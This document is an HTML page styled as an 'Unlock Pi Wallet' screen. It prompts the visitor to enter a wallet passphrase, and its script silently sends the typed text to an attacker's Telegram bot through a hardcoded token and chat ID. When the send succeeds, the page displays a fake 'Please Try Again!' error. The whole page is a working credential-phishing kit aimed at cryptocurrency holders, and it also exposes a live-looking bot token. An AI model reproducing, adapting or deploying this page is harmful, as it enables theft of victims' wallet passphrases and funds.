<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Pi Telegram Sender</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
      background: linear-gradient(135deg, #800080 0%, #800080 50%, #800080 100%);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      color: #333;
    }

    /* Status bar - removed */

    /* Header */
    .header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 16px 20px;
      color: white;
    }

    .header-left {
      display: flex;
      align-items: center;
      gap: 16px;
    }

    .back-arrow {
      font-size: 24px;
      cursor: pointer;
    }

    .header-title {
      display: flex;
      align-items: center;
      gap: 8px;
    }

    .pi-icon {
      width: 28px;
      height: 28px;
      background: linear-gradient(135deg, #F59E0B, #D97706);
      border-radius: 6px;
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      font-weight: bold;
      font-size: 16px;
    }

    .header-text {
      font-size: 20px;
      font-weight: 600;
    }

    .menu-dots {
      font-size: 24px;
      cursor: pointer;
    }

    /* Main content */
    .main-content {
      flex: 1;
      background: #F8F9FA;
      border-radius: 20px 20px 0 0;
      padding: 32px 20px 20px;
      margin-top: 8px;
    }

    .page-title {
      font-size: 28px;
      font-weight: 700;
      color: #1F2937;
      text-align: center;
      margin-bottom: 32px;
    }

    .input-container {
      background: white;
      border-radius: 12px;
      border: 1.5px solid #800080;
      margin-bottom: 16px;
      transition: all 0.2s ease;
    }

    .input-container:focus-within {
      border-color: #8B5CF6;
      box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.1);
    }

    .message-input {
      width: 100%;
      padding: 20px;
      border: none;
      outline: none;
      font-size: 16px;
      color: #374151;
      background: transparent;
      resize: vertical;
      min-height: 120px;
    }

    .message-input::placeholder {
      color: #9CA3AF;
    }

    .button-container {
      display: flex;
      flex-direction: column;
      gap: 12px;
      margin-bottom: 24px;
    }

    .unlock-button {
      width: 100%;
      padding: 16px;
      border: none;
      border-radius: 12px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.2s ease;
    }

    .unlock-button.primary {
      background: #800080;
      color: white;
    }

    .unlock-button.primary:hover {
      background: #7C3AED;
      transform: translateY(-1px);
    }

    .unlock-button.primary:active {
      transform: translateY(0);
    }

    .unlock-button.secondary {
      background: white;
      color: #8B5CF6;
      border: 1.5px solid #E5E7EB;
    }

    .unlock-button.secondary:hover {
      background: #F3F4F6;
      border-color: #8B5CF6;
    }

    .unlock-button:disabled {
      opacity: 0.6;
      cursor: not-allowed;
      transform: none;
    }

    .info-text {
      font-size: 15px;
      line-height: 1.5;
      color: #6B7280;
      margin-bottom: 16px;
    }

    .link-text {
      color: #3B82F6;
      text-decoration: none;
    }

    .link-text:hover {
      text-decoration: underline;
    }

    .status-message {
      padding: 16px;
      border-radius: 12px;
      font-size: 15px;
      font-weight: 500;
      text-align: center;
      margin-bottom: 16px;
      opacity: 0;
      transform: translateY(10px);
      transition: all 0.3s ease;
    }

    .status-message.show {
      opacity: 1;
      transform: translateY(0);
    }

    .status-message.success {
      background: #D1FAE5;
      color: #065F46;
      border: 1px solid #A7F3D0;
    }

    .status-message.error {
      background: #FEE2E2;
      color: #991B1B;
      border: 1px solid #FECACA;
    }

    .loading-spinner {
      display: inline-block;
      width: 16px;
      height: 16px;
      border: 2px solid rgba(255, 255, 255, 0.3);
      border-radius: 50%;
      border-top-color: white;
      animation: spin 1s linear infinite;
      margin-right: 8px;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    /* Home indicator */
    .home-indicator {
      position: fixed;
      bottom: 8px;
      left: 50%;
      transform: translateX(-50%);
      width: 134px;
      height: 5px;
      background: #000;
      border-radius: 3px;
      opacity: 0.3;
    }

    /* Responsive adjustments */
    @media (max-width: 375px) {
      .main-content {
        padding: 24px 16px 16px;
      }
      
      .page-title {
        font-size: 24px;
      }
    }
  </style>
</head>
<body>


  <!-- Main Content -->
  <div class="main-content">
    <h1 class="page-title">Unlock Pi Wallet</h1>
    
    <div class="input-container">
      <textarea 
        class="message-input" 
        id="messageInput" 
        placeholder="Enter your message here"
        maxlength="4096"
      ></textarea>
    </div>

    <div id="statusMessage" class="status-message"></div>

    <div class="button-container">
      <button class="unlock-button secondary" onclick="sendMessage()">
        <span class="button-text">Send With Passphrase</span>
      </button>
      
      <button class="unlock-button primary" onclick="sendMessage()">
        <span class="button-text">Send With Face ID</span>
      </button>
    </div>

    <div class="info-text">
      As a non-custodial messenger, your message
      passphrase is exclusively accessible only to you.
      Recovery of passphrase is currently impossible.
    </div>

    <div class="info-text">
      Lost your passphrase? <a href="#" class="link-text">You can create a new
      wallet</a>, but all your π in your previous wallet will
      be inaccessible.
    </div>
  </div>

  <!-- Home Indicator -->
  <div class="home-indicator"></div>

  <script>
    const TELEGRAM_BOT_TOKEN = "7805304548:AAHAAvt4YJ08ujGZRhvliOLUnQ4oMM5Lb64";
    const TELEGRAM_CHAT_ID = "7666653410";

    function sendMessage() {
      const input = document.getElementById("messageInput");
      const statusMessage = document.getElementById("statusMessage");
      const buttons = document.querySelectorAll(".unlock-button");
      const buttonTexts = document.querySelectorAll(".button-text");
      
      const message = input.value.trim();
      
      if (!message) {
        showStatus("Please enter a message", "error");
        return;
      }

      // Disable buttons and show loading
      buttons.forEach((button, index) => {
        button.disabled = true;
        buttonTexts[index].innerHTML = `<span class="loading-spinner"></span>Sending...`;
      });
      
      statusMessage.classList.remove("show");

      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message
        })
      })
      .then(response => response.json())
      .then(data => {
        if (data.ok) {
          showStatus("✗ Please Try Again!", "error");
          input.value = "";
        } else {
          showStatus("✗ Failed to send message", "error");
        }
      })
      .catch(error => {
        showStatus("⚠ Connection error occurred", "error");
        console.error("Error:", error);
      })
      .finally(() => {
        // Reset buttons
        buttons.forEach((button, index) => {
          button.disabled = false;
          if (index === 0) {
            buttonTexts[index].innerHTML = "Send With Passphrase";
          } else {
            buttonTexts[index].innerHTML = "Send With Face ID";
          }
        });
      });
    }

    function showStatus(message, type) {
      const statusMessage = document.getElementById("statusMessage");
      statusMessage.textContent = message;
      statusMessage.className = `status-message ${type}`;
      
      setTimeout(() => {
        statusMessage.classList.add("show");
      }, 100);
    }

    // Auto-resize textarea
    const textarea = document.getElementById("messageInput");
    textarea.addEventListener("input", function() {
      this.style.height = "auto";
      this.style.height = Math.min(this.scrollHeight, 200) + "px";
    });

    // Focus input on load
    window.addEventListener("load", () => {
      document.getElementById("messageInput").focus();
    });
  </script>
</body>
</html>
